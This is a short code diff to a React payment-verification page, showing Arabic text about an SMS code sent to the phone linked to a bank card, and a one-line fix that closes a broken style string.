@@ -209,4 +209,4 @@ export default function VerifyPhonePage() {
 
             <div style={{ fontSize: '18px', lineHeight: '1.4', color: '#000000', marginBottom: '25px', maxWidth: '320px' }}>
               تم ارسال رمز التحقق لرقم هاتفكم المرتبط بالبطاقة المصرفيةلتأكيد الدفع بإستخدام بطاقة
-              <span style={{ display: 'block', direction: 'ltr', fontFamily: 'monospace,
+              <span style={{ display: 'block', direction: 'ltr', fontFamily:'monospace',
